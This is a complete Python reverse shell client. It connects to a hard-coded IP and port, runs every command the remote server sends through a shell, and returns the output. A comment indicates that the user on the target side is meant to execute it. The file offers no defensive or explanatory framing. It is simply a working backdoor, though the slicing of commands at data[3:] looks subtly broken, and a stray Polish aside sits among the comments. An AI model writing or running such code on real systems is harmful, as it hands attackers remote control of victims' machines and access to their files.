import os
import socket
import subprocess

# User has to execute this to connect to the server


s = socket.socket()
host = "10.43.38.36"
port = 9997
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    # If actual data was received:
    if len(data) > 0:
        # Run a command as if you were in the terminal
        cmd = subprocess.Popen(data[3:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()

        output_str = str(output_bytes, "utf-8")

        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)

        # Czy przeżyłbyś to życie raz jeszcze?

# Close connection

s.close()


